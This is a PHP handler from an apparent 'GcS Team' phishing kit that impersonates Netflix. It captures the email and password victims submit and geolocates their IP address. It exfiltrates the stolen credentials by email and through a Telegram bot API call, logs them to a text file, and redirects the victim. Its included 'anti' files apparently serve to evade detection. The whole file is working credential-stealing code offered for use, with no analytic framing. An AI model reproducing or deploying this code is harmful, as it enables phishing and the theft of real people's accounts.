<?php
/*
  ________             _________    ___________                            
 /  _____/    ____    /   _____/    \__    ___/   ____   _____      _____  
/   \  ___  _/ ___\   \_____  \       |    |    _/ __ \  \__  \    /     \ 
\    \_\  \ \  \___   /        \      |    |    \  ___/   / __ \_ |  Y Y  \
 \______  /  \___  > /_______  /      |____|     \___  > (____  / |__|_|  /
        \/       \/          \/                      \/       \/        \/ 
*/
session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";
$_SESSION['userLoignId'] = $_POST['userLoginId'];
$_SESSION['password'] = $_POST['password'];

$file = fopen("NetFlix_RzlT.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";


$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "GcS Team 💖 NetFlix log 💖  $ip";
$headers = "From: GcS-Team<info@GcSTeam.com>";
$send = $email; 


$message = "[GcS Team][+]━━━━━━━━【💖 NetFlix log 💖】━━━━━━━━[+][GcS Team]\r\n";
$message .= "|Email      : ".$_POST['userLoginId']."\r\n";
$message .= "|Password      	 : ".$_POST['password']."\r\n";
$message .= "[+]━━━━━━━━【💻 System INFO】━━━━━━━━[+]\r\n";
$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[GcS Team][+]━━━━━━━━【💖 NetFlix log 💖】━━━━━━━━[+][GcS Team]\n";

mail($send,$subject,$message,$headers);


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

$myfile = fopen("NetFlix_RzlT.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

HEADER("Location: ../restart.php");


?>

